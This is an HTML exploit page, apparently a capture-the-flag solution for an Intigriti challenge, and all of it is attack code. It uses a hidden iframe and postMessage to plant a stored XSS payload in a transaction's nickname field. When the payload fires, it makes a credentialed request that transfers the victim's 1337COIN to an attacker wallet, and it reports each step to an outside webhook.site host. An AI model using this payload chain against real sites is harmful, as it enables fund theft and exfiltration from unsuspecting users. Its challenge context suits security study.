<!DOCTYPE html>
<html>
<head><title>Final Exploit</title></head>
<body>
<div id="log"></div>

<script>
const T = 'https://challenge-0126.intigriti.io';
const W = 'https://webhook.site/9791405f-5438-423e-a4bc-56e27623afe9';
const WALLET = '1f9c3f0d5ebe9960d50b5e030572d264df';

let step = 0;

function log(msg) {
    step++;
    const ts = new Date().toISOString();
    document.getElementById('log').innerHTML += '<div>['+step+'] '+msg+' <small>('+ts+')</small></div>';
    console.log('['+step+']', msg);
    new Image().src = W+'/?steal='+step+'&m='+encodeURIComponent(msg)+'&t='+Date.now();
}

async function exploit() {
    log('STARTING COIN THEFT');

    // Load checkout in iframe
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = T + '/checkout.html?currency=1337COIN&price=1';
    document.body.appendChild(iframe);

    await new Promise(r => { iframe.onload = r; });
    await new Promise(r => setTimeout(r, 3000));
    log('Checkout loaded');

    // XSS Payload: Send 1 1337COIN from admin to our wallet
    const xssPayload = `<img src=x onerror="
        (async()=>{
            const log=m=>fetch('${W}/?xss='+encodeURIComponent(m),{mode:'no-cors'});
            try{
                log('XSS: Sending coin...');
                const r=await fetch('${T}/api/transaction',{
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    credentials:'include',
                    body:JSON.stringify({
                        toAddress:'${WALLET}',
                        currency:'1337COIN',
                        amount:1
                    })
                });
                log('XSS: TX status '+r.status);
                if(r.ok){
                    log('XSS: COIN SENT!');
                    document.body.innerHTML='<h1 style=background:green;color:white;padding:20px>COIN SENT!</h1>';
                }else{
                    const t=await r.text();
                    log('XSS: Failed '+t);
                }
            }catch(e){
                log('XSS: Error '+e.message);
            }
        })()
    ">`;

    log('Sending transaction with XSS payload...');

    // Send postMessage to create transaction with XSS
    iframe.contentWindow.postMessage({
        type: 'submitTransaction',
        transaction: {
            toAddress: WALLET,
            currency: '1337COIN',
            amount: 1,
            nickname: xssPayload
        }
    }, '*');

    log('postMessage sent');

    await new Promise(r => setTimeout(r, 3000));
    log('Redirecting to MarketWatch to trigger XSS...');

    // Redirect to marketwatch where XSS will execute and send coin
    window.location.href = T + '/marketwatch.html';
}

setTimeout(exploit, 1000);
</script>
</body>
</html>
